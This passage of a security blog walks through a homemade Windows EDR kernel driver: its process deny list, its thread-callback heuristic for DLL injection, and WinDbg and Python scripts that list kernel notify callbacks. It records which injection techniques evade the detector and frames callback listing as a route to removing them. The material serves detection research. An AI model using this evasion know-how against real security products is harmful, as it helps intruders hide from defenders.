+</code></pre></div><p>As we can see from above, we have a <code>mutex</code> that guarantees that the doubly linked listed, where we keep the list of the processes that we want to block, is not being manipulated. Then, we iterate over the list in the <code>while</code> loop and if the process name matches we set the structure field mentioned above (<code>CreationStatus</code>) to <code>STATUS_ACCESS_DENIED</code>. Simple. This shouldn&rsquo;t be done with process names (but hashed values) for obvious reasons, but bear with me.</p>
+<p>If you have a debugger attached you can also see the following debug message if there&rsquo;s a match.</p>
+<p><img src="/callbacks/edr026.png" alt=""></p>
+<p>If you want to look at the code responsible to add a process name to the doubly linked list, you can look at the <code>EdrDeviceControl</code> function, where the <code>IOCTL_EDR_ADD_DENY_RULE</code> is handled (right below the code shown above). I&rsquo;m simply using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry">LIST_ENTRY</a> API calls to manage the doubly linked list.</p>
+<h3 id="dll-injection-detection">DLL injection detection</h3>
+<p>The DLL injection detection mechanism I implemented in the kernel driver is very simple, actually basic. Still, it gives you an idea of how hard it can be to develop something without triggering many false positives. And, at the same time be able to cover all the possible DLL injection techniques there is. We aren&rsquo;t even talking about code injection techniques, just DLL injection (which is only a subset of code injection).</p>
+<p>Knowing that the first thread in a process is always remotely created, our heuristic is simple. If a process has more than one thread, and we see another remotely created thread we flag it as DLL injection (with the caveat described below). This is not bulletproof and while it works for the typical <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a> it won&rsquo;t work so well for a few more obscure techniques as we will see.</p>
+<p>Again, the logic behind this detection is quite simple. However, believe it, or not, this method is used in multiple AV solutions. As we all know, a lot of &ldquo;malware&rdquo; injects code/threads into other/remote processes to avoid detection. The typical, and most basic scenario as referenced above is to use the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a> API to write data/shellcode to an area of memory in a specified process, and then call <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a>. This is a very well documented technique, and there&rsquo;s plenty of source code available online to do this. Windows itself uses it all the time. Anyway, I wrote a simple (and ugly) DLL injection tool a while ago that you can use for testing. It contains 7 different DLL injection techniques and can be found <a href="https://github.com/houseofxyz/injectAllTheThings">here</a>.</p>
+<h4 id="thread-notifications">Thread Notifications</h4>
+<p>The kernel also provides an API call for thread creation and termination, just like for process callbacks. The API is <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine">PsSetCreateThreadNotifyRoutine</a>. To unregistering, this time, we have a second API call. <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psremovecreatethreadnotifyroutine">PsRemoveCreateThreadNotifyRoutine</a>. The parameters to the former are process ID, the thread ID, and a boolean value depending on the thread being created or terminated.</p>
+<p>You can find all these definitions in the <a href="https://github.com/houseofxyz/wdk-header-files/blob/master/win10rs5/ntddk.h">ntddk.h</a> header file already mentioned.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#fff;font-weight:bold">typedef</span>
+VOID
+(*PCREATE_THREAD_NOTIFY_ROUTINE)(
+    _In_ HANDLE ProcessId,
+    _In_ HANDLE ThreadId,
+    _In_ BOOLEAN Create
+    );
+
+NTKERNELAPI
+NTSTATUS
+PsSetCreateThreadNotifyRoutine(
+    _In_ PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine
+    );
+
+NTKERNELAPI
+NTSTATUS
+PsRemoveCreateThreadNotifyRoutine (
+    _In_ PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine
+    );
+</code></pre></div><p>In our pseudo-EDR driver we register our callback function (<code>OnThreadNotify</code>) as shown below in the <code>DriverEntry</code> function:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">status = PsSetCreateThreadNotifyRoutine(OnThreadNotify);
+<span style="color:#fff;font-weight:bold">if</span> (!NT_SUCCESS(status)) {
+    KdPrint((DRIVER_PREFIX <span style="color:#0ff;font-weight:bold">&#34;failed to set thread callback (status=%08X)</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, status));
+    <span style="color:#fff;font-weight:bold">break</span>;
+}
+</code></pre></div><p>So, to detect DLL injection, in our <code>OnThreadNotify</code> function, that&rsquo;s called in-line every time a thread is created/terminated, we can do something like this (pseudo-code):</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#fff;font-weight:bold">void</span> OnThreadNotify(HANDLE RemoteProcessId, HANDLE ThreadId, BOOLEAN Create) {
+
+currentProcess = GetCurrentProcess()
+
+<span style="color:#fff;font-weight:bold">if</span> currentProcess not equal to RemoteProcessId
+	THREAD INJECTION DETECTED
+</code></pre></div><p>Quite simply, if the current process and the remote process are different it means the thread has been injected. This is not good enough because of what I mentioned before. In Windows, the first thread is always created remotely. So, in our <code>OnThreadNotify</code> function, we use the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid">PsLookupProcessByProcessId</a> to obtain a referenced pointer to the <a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/eprocess/index.htm">EPROCESS</a> structure of the process.</p>
+<p>We are interested in the <code>ActiveThreads</code> field of the <code>EPROCESS</code> structure. This structure is not documented but we can look at it in a debugger. Here&rsquo;s its definition on Windows 10 x64 1903 (OS Build 18362.592).</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; dt nt!_EPROCESS
+nt!_EPROCESS
+   +0x000 Pcb              : _KPROCESS
+   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
+   +0x2e8 UniqueProcessId  : Ptr64 Void
+   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
+(...)
+   +0x448 ImageFilePointer : Ptr64 _FILE_OBJECT
+   +0x450 ImageFileName    : [15] UChar
+   +0x45f PriorityClass    : UChar
+(...)
+   +0x488 ThreadListHead   : _LIST_ENTRY
+   +0x498 ActiveThreads    : Uint4B        &lt;-------------
+   +0x49c ImagePathHash    : Uint4B
+(...)
+   +0x878 MmHotPatchContext : Ptr64 Void
+</code></pre></div><p>The code responsible for what&rsquo;s described above is below.</p>
+<p>Warning: there are hardcoded offsets all over the place, these will be fixed at some point.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">status = PsLookupProcessByProcessId(ProcessId, &amp;Process);
+<span style="color:#fff;font-weight:bold">if</span> (!NT_SUCCESS(status))
+{
+	KdPrint((<span style="color:#0ff;font-weight:bold">&#34;PsLookupProcessByProcessId()</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>));
+	<span style="color:#fff;font-weight:bold">return</span>;
+}
+
+idProcess = PsGetCurrentProcessId();
+idThread = PsGetCurrentThreadId();
+
+<span style="color:#fff;font-weight:bold">if</span> (HandleToULong(idProcess) == <span style="color:#ff0;font-weight:bold">4</span>)  <span style="color:#007f7f">//ignore the system process   
+</span><span style="color:#007f7f"></span>{
+	<span style="color:#fff;font-weight:bold">return</span>;
+}
+
+lpProcess = (LPTSTR)Process;
+lpProcess = (LPTSTR)(lpProcess + <span style="color:#ff0;font-weight:bold">0x450</span>); <span style="color:#007f7f">// ImageFileName dt _EPROCESS 
+</span><span style="color:#007f7f"></span>
+<span style="color:#fff;font-weight:bold">if</span> (idProcess != ProcessId)
+{
+	PEPROCESS iProcess;
+	LPTSTR lpProcessIn;
+	status = PsLookupProcessByProcessId(idProcess, &amp;iProcess);
+	lpProcessIn = (LPTSTR)iProcess;
+	lpProcessIn = (LPTSTR)(lpProcessIn + <span style="color:#ff0;font-weight:bold">0x450</span>); <span style="color:#007f7f">// ImageFileName dt _EPROCESS
+</span><span style="color:#007f7f"></span>
+	LPTSTR ActiveThreads = (LPTSTR)(lpProcess + <span style="color:#ff0;font-weight:bold">0x48</span>); <span style="color:#007f7f">// ActiveThreads dt _EPROCESS
+</span><span style="color:#007f7f"></span>	
+	<span style="color:#fff;font-weight:bold">if</span>((UINT32)*ActiveThreads &gt; <span style="color:#ff0;font-weight:bold">1</span>) <span style="color:#007f7f">// first thread is always created remotely
+</span><span style="color:#007f7f"></span>		KdPrint((<span style="color:#0ff;font-weight:bold">&#34;[EDR Thread Injection] Remote Process %d (%s) &lt;thread %d&gt; was injected by Process %d (%s) &lt;thread %d&gt; | Remote Process # Threads: %d</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, ProcessId, lpProcess, ThreadId, idProcess, lpProcessIn, idThread, (UINT32)*ActiveThreads));
+}
+</code></pre></div><p>Warning: As you can see from above, <code>ImageFileName</code> is <code>[15] UChar</code> so the process name if bigger that 16 is going to be truncated. It doesn&rsquo;t matter, but if you are aiming for perfection use the field <code>SeAuditProcessCreationInfo</code>.</p>
+<p>For example:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: kd&gt; dt nt!_EPROCESS SeAuditProcessCreationInfo. ffff8882af0c2080
+   +0x468 SeAuditProcessCreationInfo  :
+      +0x000 ImageFileName               : 0xffff8882`af8c3850 _OBJECT_NAME_INFORMATION
+0: kd&gt; dt _OBJECT_NAME_INFORMATION 0xffff8882`af8c3850
+nt!_OBJECT_NAME_INFORMATION
+   +0x000 Name             : _UNICODE_STRING &#34;\Device\HarddiskVolume3\Users\rui\Desktop\procexp64.exe&#34;
+</code></pre></div><p>Note that we ignore the <code>SYSTEM</code> process because we aren&rsquo;t interested in it, and Windows itself does DLL injection all the time.</p>
+<p>We can quickly demo this with the DLL injection binaries I mentioned above. Please attach a kernel debugger to the target VM and don&rsquo;t forget to enter the <code>ed nt!Kd_Default_Mask 8</code> to see the debug messages. DLL injection is not blocked, simply logged and you won&rsquo;t be able to see these being flagged without a kernel debugger attached. As a target process, we&rsquo;ll be using <code>notepad.exe</code>.</p>
+<p><img src="/callbacks/edr008.png" alt=""></p>
+<p>And we can see the following in our kernel debugger.</p>
+<p><img src="/callbacks/edr007.png" alt=""></p>
+<p>And if look at the <code>notepad.exe</code> process with <a href="https://processhacker.sourceforge.io/">Process Hacker</a> we can see that we have indeed 8 threads and we can easily identify what was the injected thread. Right?</p>
+<p><img src="/callbacks/edr009.png" alt=""></p>
+<p>If you aren&rsquo;t familiar with how the <code>CreateRemoteThread</code> DLL injection technique works I recommend you to read the <code>injector</code> source code or this <a href="http://deniable.org/windows/inject-all-the-things">post</a>. Anyway, the remote thread we created executes <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw">LoadLibraryW</a> and we can easily identify that thread (6316) with <code>Process Hacker</code> and in the log message displayed in our debugger.</p>
+<p>We can now try to play with the <a href="https://github.com/houseofxyz/injectAllTheThings">injectAllTheThings</a> binary and see if &ldquo;our&rdquo; pseudo-EDR can detect other DLL injection techniques that don&rsquo;t follow this usual pattern.</p>
+<p><img src="/callbacks/edr010.png" alt=""></p>
+<p>The first technique we already tried, let&rsquo;s try the second one using <a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtCreateThread.html">NtCreateThreadEx</a>. Even though this API is undocumented, the technique itself it&rsquo;s still pretty much the same as the one we used above.</p>
+<p><img src="/callbacks/edr013.png" alt=""></p>
+<p><img src="/callbacks/edr011.png" alt=""></p>
+<p><img src="/callbacks/edr012.png" alt=""></p>
+<p>Still detected.</p>
+<p>Let&rsquo;s try the next one. This time using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC</a> API. Again, if you don&rsquo;t know how these techniques work under the wood have a look at this <a href="http://deniable.org/windows/inject-all-the-things">post</a>.</p>
+<p><img src="/callbacks/edr015.png" alt=""></p>
+<p><img src="/callbacks/edr014.png" alt=""></p>
+<p>This time, we didn&rsquo;t get any &ldquo;alert&rdquo; in our kernel debugger. So, no detection. Hmm, stealthy DLL injection technique for the red teamers out there?</p>
+<p>Let&rsquo;s move to the next one using <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookEx</a>.</p>
+<p><img src="/callbacks/edr017.png" alt=""></p>
+<p><img src="/callbacks/edr016.png" alt=""></p>
+<p>Again, no detection. If you don&rsquo;t see the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">MessageBox</a> please see the post I mentioned before describing how these techniques work. Anyway, another stealthy one for red teamers?</p>
+<p>Let&rsquo;s try the next one, <a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html">RtlCreateUserThread</a>.</p>
+<p><img src="/callbacks/edr019.png" alt=""></p>
+<p><img src="/callbacks/edr018.png" alt=""></p>
+<p>This time, the DLL injection was detected (as expected).</p>
+<p><img src="/callbacks/edr020.png" alt=""></p>
+<p>Let&rsquo;s try the next one, <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">SetThreadContext</a>.</p>
+<p><img src="/callbacks/edr022.png" alt=""></p>
+<p><img src="/callbacks/edr021.png" alt=""></p>
+<p>As expected, not detected. Finally, let&rsquo;s try the famous <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">Reflective DLL injection</a> technique by Stephen Fewer.</p>
+<p><img src="/callbacks/edr024.png" alt=""></p>
+<p><img src="/callbacks/edr023.png" alt=""></p>
+<p>Detected again. Cool!</p>
+<p><img src="/callbacks/edr025.png" alt=""></p>
+<p>The results are not surprising if you played with this before. The idea of going through all the techniques was more to show you how you can use these small projects to help you test against some detection mechanisms employed by Endpoint Security products. I used <code>injectAllTheThings.exe</code> multiple times to help me work around detections, I know at least two consultancy (red) teams that also <a href="https://www.youtube.com/watch?v=wIhlchiRmKQ&amp;t=1385">use it</a> regularly, and successfully. You now know that the technique used in the pseudo-EDR is not enough to detect certain techniques. You know what are its weaknesses. So start improving it!</p>
+<p>As you can see it&rsquo;s not an easy task to cover all possible code injection techniques from a detection point of view. We (well, not me) sometimes laugh at security products. However, in some cases (not always), if we start playing on the other side it&rsquo;s not so funny.</p>
+<h4 id="image-load-notifications">Image Load Notifications</h4>
+<p>Any Endpoint Security software is heavily interested in Image loads. Every time a PE image (<code>EXE</code>, <code>DLL</code>, <code>SYS</code>, <code>CPL</code>, &hellip;) file loads our pseudo-EDR will receive a notification. We can register for these notifications by using the API call <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine">PsSetLoadImageNotifyRoutine</a>. To stop receiving them, we can unregister by using the API call <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psremoveloadimagenotifyroutine">PsRemoveLoadImageNotifyRoutine</a>.</p>
+<p>We can find its definition in the <a href="https://github.com/houseofxyz/wdk-header-files/blob/master/win10rs5/ntddk.h">ntddk.h</a> file:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#fff;font-weight:bold">typedef</span>
+VOID
+(*PLOAD_IMAGE_NOTIFY_ROUTINE)(
+    _In_opt_ PUNICODE_STRING FullImageName,
+    _In_ HANDLE ProcessId,                <span style="color:#007f7f">// pid into which image is being mapped
+</span><span style="color:#007f7f"></span>    _In_ PIMAGE_INFO ImageInfo
+    );
+</code></pre></div><p>In our driver, we register for image load notifications in the <code>DriverEntry</code> function.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">status = PsSetLoadImageNotifyRoutine(OnImageLoadNotify);
+<span style="color:#fff;font-weight:bold">if</span> (!NT_SUCCESS(status)) {
+    KdPrint((DRIVER_PREFIX <span style="color:#0ff;font-weight:bold">&#34;failed to set image load callback (status=%08X)</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, status));
+    <span style="color:#fff;font-weight:bold">break</span>;
+}
+</code></pre></div><p>However, we don&rsquo;t do &ldquo;anything&rdquo; in the <code>OnImageLoadNotify</code> function. However, there&rsquo;s an interesting gotcha worth mentioning. The <code>FullImageName</code> argument you can see above is optional as noted by the <a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/sal-annotations?view=vs-2019">SAL annotation</a>. This means it can be <code>NULL</code> and it doesn&rsquo;t always produce the correct image file name. Microsoft <a href="https://www.trendmicro.com/vinfo/pl/security/news/security-technology/windows-kernel-bug-found-can-be-abused-to-reportedly-bypass-security-systems">is aware of this issue</a>, and this issue can allegedly be abused to bypass some Security systems. There are two really interesting posts about the root cause of this issue from Ensilo, <a href="https://blog.ensilo.com/windows-pssetloadimagenotifyroutine-callbacks-the-good-the-bad-and-the-unclear-part-1">here</a> and <a href="https://blog.ensilo.com/windows-pssetloadimagenotifyroutine-callbacks-the-good-the-bad-and-the-unclear-part-2">here</a>. There&rsquo;s another different issue with this callback, that I might talk about in a different post.</p>
+<h2 id="kernel-notify-callbacks-enumeration">Kernel Notify Callbacks Enumeration</h2>
+<p>As mentioned before, if we can set these callbacks&hellip; we can also remove them. If the callback is set by our driver it&rsquo;s trivial to unset it. However, if we want to enumerate all the callbacks that exist on the system extra work is required.</p>
+<p>We can use some <code>kd</code> scripting kung-fu and enumerate all the callbacks registered in the system easily.</p>
+<h4 id="kd-windbg-script">KD (WinDbg) script</h4>
+<p>To look at the callbacks registered in the system we can use some debugging and automation scripts.</p>
+<p>You can use the <code>kd</code> script below to list Process, Threads, and Image load callbacks. It&rsquo;s not very robust in terms of error handling at the moment. Feel free to improve it. There are no dependencies, just some quick scripting with the Debugging Tools.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$$ displays a list of all registered process/thread creation and image load callbacks
+$$ $$&gt;&lt;C:\Users\rui\Desktop\windbg-scripts\psnotifycallbacks.wdb
+
+
+r $t0 = dwo(nt!PspCreateProcessNotifyRoutineExCount)
+r $t1 = dwo(nt!PspCreateProcessNotifyRoutineCount)
+r $t3 = nt!PspCreateProcessNotifyRoutine
+
+aS ${Total} (@$t0 + @$t1)
+
+.block
+{  
+  .printf &#34;[+] Total of: %u CreateProcessNotifyRoutines\n&#34;, ${Total}
+
+  .for (r $t4 = 0 ; $t4 &lt; ${Total} ; r $t4 = @$t4 + 1)
+  {
+    r $t5 = poi(@$t3 + (@$ptrsize * @$t4))
+    r $t5 = @@C++(@$t5 &amp; (~0xf))
+    r $t6 = (@$t5 + @$ptrsize)
+    .printf &#34;[%u] %y\n&#34;, @$t4, poi(@$t6)
+  }
+}
+
+ad /q _sr_${Total};
+
+r $t0 = dwo(nt!PspCreateThreadNotifyRoutineCount)
+r $t1 = nt!PspCreateThreadNotifyRoutine
+
+aS ${Total} @$t0
+
+.block
+{
+  .printf &#34;\n[+] Total of: %u CreateThreadNotifyRoutines\n&#34;, ${Total}
+
+  .for (r $t4 = 0 ; $t4 &lt; ${Total} ; r $t4 = @$t4 + 1)
+  {
+    r $t5 = poi(@$t1 + (@$ptrsize * @$t4))
+    r $t5 = @@C++(@$t5 &amp; (~0xf))
+    r $t6 = (@$t5 + @$ptrsize)
+    .printf &#34;[%u] %y\n&#34;, @$t4, poi(@$t6)
+  }
+}
+
+ad /q _sr_${Total};
+
+r $t0 = dwo(nt!PspLoadImageNotifyRoutineCount)
+r $t1 = nt!PspLoadImageNotifyRoutine
+
+aS ${Total} (@$t0)
+
+.block
+{
+
+  .printf &#34;\n[+] Total of: %u CreateLoadImageRoutines\n&#34;, ${Total}
+
+  .for (r $t4 = 0 ; $t4 &lt; ${Total} ; r $t4 = @$t4 + 1)
+  {
+    r $t5 = poi(@$t1 + (@$ptrsize * @$t4))
+    r $t5 = @@C++(@$t5 &amp; (~0xf))
+    r $t6 = (@$t5 + @$ptrsize)
+    .printf &#34;[%u] %y\n&#34;, @$t4, poi(@$t6)
+  }
+}
+
+ad /q _sr_${Total};
+ad /q *;
+</code></pre></div><p>In case you aren&rsquo;t familiar with Windows debugging scripting, here&rsquo;s a brief description about what&rsquo;s going on. As mentioned before, when a driver registers a process callback, the pointer to the callback is stored in an internal data structure. More precisely, an array of pointers (to those data structures). This is maintained in a global variable named <code>nt!PspCreateProcessNotifyRoutine</code>. Yes, global variable!</p>
+<p>Depending on the API, and Windows version, that was used to register the process callbacks, either one of the 2 counters is used:</p>
+<ul>
+<li><code>nt!PspCreateProcessNotifyRoutineExCount</code></li>
+<li><code>nt!PspCreateProcessNotifyRoutineCount</code></li>
+</ul>
+<p>These counters are incremented when a new callback is registered in the system.</p>
+<p>The same happens for threads, and every time an image is (un)loaded. So, we calculate the total number of callbacks and then iterate through the array of pointers to get the respective structures to display the symbol associated with the callback function pointer. If you aren&rsquo;t getting symbols try using <code>.reload</code> before running the script.</p>
+<p>The <code>$t0</code> to <code>$t6</code> are the debugger temporary registers and are used as variables. The <code>r</code> is used when we use them for the first time on a new line of the script. <code>dwo</code> is a <code>Masm</code> operator used to read the <code>DWORD</code> of 32 bits values. With <code>aS</code> we are setting an alias count to the sum of the registers <code>$t0</code> and <code>$t1</code>.</p>
+<p><code>.printf</code>, as I bet you can guess, is a control flow token and part of the debugging scripting language which can be used to format and display values from the debugger script.</p>
+<p>Probably you can also guess what <code>.for</code> is. Correct, another control flow token. <code>poi</code> is a <code>MASM</code> operator similar to <code>dwo</code> but it is used to reference pointer size values.</p>
+<p><code>@$ptrsize</code> is a pseudo register that is automatically set to 4, or 8, depending on the target system being debugged (a 32 or 64-bit system respectively).</p>
+<p>For the debugger to process the <code>&amp;</code> and <code>~</code> operators, both part of the <code>C++</code> language, we have to switch to the <code>C++</code> expression evaluator using <code>@@C++</code>. With <code>ad ${/v:Count}</code> we delete the alias count so it doesn&rsquo;t interfere with the subsequent executions of the script.</p>
+<p>Finally, to run the external script in the debugger:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$$&gt;&lt;c:\path\to\script.wdb
+</code></pre></div><p>Here&rsquo;s the output of the execution of the script above in my system.</p>
+<p><img src="/callbacks/windbg001.png" alt=""></p>
+<p>We can see all the notification callback routines registered by our pseudo-EDR driver. You might recognize some, and if you looked at these before you might even notice that one that&rsquo;s usually here&hellip; is missing. Yes, I disabled <a href="https://en.wikipedia.org/wiki/Windows_Defender">Windows Defender</a> in this system, so the <code>WdFilter.sys</code> is missing. Good catch!</p>
+<h4 id="python-script">Python script</h4>
+<p>While the above is enough, because I like Python, based on this <a href="https://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html">triplefault.io post</a> I &ldquo;hacked&rdquo; the following Python script with <a href="https://githomelab.ru/pykd/pykd">Pykd</a> that you can use to enumerate Process, Threads, and Image Load callbacks as well.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">from</span> pykd <span style="color:#fff;font-weight:bold">import</span> *
+
+version = getSystemVersion()
+
+<span style="color:#fff;font-weight:bold">def</span> ptr_size():
+  <span style="color:#fff;font-weight:bold">if</span> is64bitSystem():
+  	<span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">8</span>
+  <span style="color:#fff;font-weight:bold">else</span>:
+  	<span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">4</span>
+
+<span style="color:#fff;font-weight:bold">def</span> checkKernelDebugging():
+  <span style="color:#fff;font-weight:bold">if</span> not isKernelDebugging() and not isLocalKernelDebuggerEnabled():
+    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[-] Not running inside KD!&#34;</span>)
+    <span style="color:#fff;font-weight:bold">exit</span>(<span style="color:#ff0;font-weight:bold">1</span>)
+
+<span style="color:#007f7f"># load required module &#39;nt&#39;</span>
+<span style="color:#fff;font-weight:bold">def</span> loadNT():
+  <span style="color:#fff;font-weight:bold">try</span>:
+    nt = module(<span style="color:#0ff;font-weight:bold">&#34;nt&#34;</span>)
+  <span style="color:#fff;font-weight:bold">except</span>: 
+    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[-] Couldn&#39;t not get the base address of &#39;ntoskrnl&#39;.&#34;</span>)
+    <span style="color:#fff;font-weight:bold">exit</span>(<span style="color:#ff0;font-weight:bold">1</span>)
+  <span style="color:#fff;font-weight:bold">return</span> nt
+
+<span style="color:#fff;font-weight:bold">def</span> fastref(_EX_FAST_REF):
+  <span style="color:#007f7f"># discard last 4 bits of the pointer</span>
+  <span style="color:#fff;font-weight:bold">return</span> ((_EX_FAST_REF &gt;&gt; <span style="color:#ff0;font-weight:bold">4</span>) &lt;&lt; <span style="color:#ff0;font-weight:bold">4</span>)
+
+<span style="color:#fff;font-weight:bold">def</span> listCallbacks(CallbacksArray, ArraySize):
+  PSIZE = ptr_size()
+  <span style="color:#fff;font-weight:bold">for</span> i in <span style="color:#fff;font-weight:bold">range</span>(ArraySize):
+    callback = (CallbacksArray + (i * PSIZE))
+    <span style="color:#fff;font-weight:bold">try</span>:
+      callback = ptrPtr(callback)
+    <span style="color:#fff;font-weight:bold">except</span>:
+      <span style="color:#fff;font-weight:bold">print</span> i
+      <span style="color:#fff;font-weight:bold">print</span> ArraySize
+      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[-] Couldn&#39;t read memory!!&#34;</span>)
+      <span style="color:#fff;font-weight:bold">exit</span>(<span style="color:#ff0;font-weight:bold">1</span>)
+    <span style="color:#fff;font-weight:bold">if</span> callback == <span style="color:#ff0;font-weight:bold">0</span>:
+      <span style="color:#fff;font-weight:bold">continue</span>
+    obj = fastref(callback)
+
+    <span style="color:#fff;font-weight:bold">try</span>:
+	  apicall = ptrPtr(obj + (PSIZE))
+    <span style="color:#fff;font-weight:bold">except</span>:
+      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[-] Couldn&#39;t read memory!&#34;</span>)
+      <span style="color:#fff;font-weight:bold">exit</span>(<span style="color:#ff0;font-weight:bold">1</span>)
+
+    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[{}] {:#x} ({})&#34;</span>.format(i, apicall, findSymbol(apicall)))
+
+<span style="color:#fff;font-weight:bold">def</span> processCallbacks(nt):
+  <span style="color:#fff;font-weight:bold">try</span>:
+  	<span style="color:#007f7f"># read counters</span>
+    PspCreateProcessNotifyRoutineExCount = ptrDWord(nt.offset(<span style="color:#0ff;font-weight:bold">&#34;PspCreateProcessNotifyRoutineExCount&#34;</span>))
+    PspCreateProcessNotifyRoutineCount  = ptrDWord(nt.offset(<span style="color:#0ff;font-weight:bold">&#34;PspCreateProcessNotifyRoutineCount&#34;</span>))
+    <span style="color:#007f7f"># get the address of the symbol PspCreateProcessNotifyRoutine</span>
+    PspCreateProcessNotifyRoutine = nt.offset(<span style="color:#0ff;font-weight:bold">&#34;PspCreateProcessNotifyRoutine&#34;</span>)
+  <span style="color:#fff;font-weight:bold">except</span>:
+  	<span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[-] Couldn&#39;t not read memory and/or load Symbols&#34;</span>)
+  	<span style="color:#fff;font-weight:bold">exit</span>(<span style="color:#ff0;font-weight:bold">1</span>)
+
+  <span style="color:#007f7f"># if &lt;= Windows 2003 https://www.gaijin.at/en/infos/windows-version-numbers</span>
+  <span style="color:#fff;font-weight:bold">if</span> version.buildNumber &lt;= <span style="color:#ff0;font-weight:bold">3790</span>:
+  	num = PspCreateProcessNotifyRoutineCount
+  <span style="color:#fff;font-weight:bold">else</span>:
+    num = PspCreateProcessNotifyRoutineExCount + PspCreateProcessNotifyRoutineCount
+  <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[+] Total of: {} CreateProcessNotifyRoutines&#34;</span>.format(num))
+  listCallbacks(PspCreateProcessNotifyRoutine, num)
+
+<span style="color:#fff;font-weight:bold">def</span> threadCallbacks(nt):
+  <span style="color:#fff;font-weight:bold">try</span>:
+  	<span style="color:#007f7f"># counter</span>
+    PspCreateThreadNotifyRoutineCount = ptrDWord(nt.offset(<span style="color:#0ff;font-weight:bold">&#34;PspCreateThreadNotifyRoutineCount&#34;</span>))
+    <span style="color:#007f7f"># get the address of the symbol PspCreateThreadNotifyRoutine</span>
+    PspCreateThreadNotifyRoutine = nt.offset(<span style="color:#0ff;font-weight:bold">&#34;PspCreateThreadNotifyRoutine&#34;</span>)
+  <span style="color:#fff;font-weight:bold">except</span>:
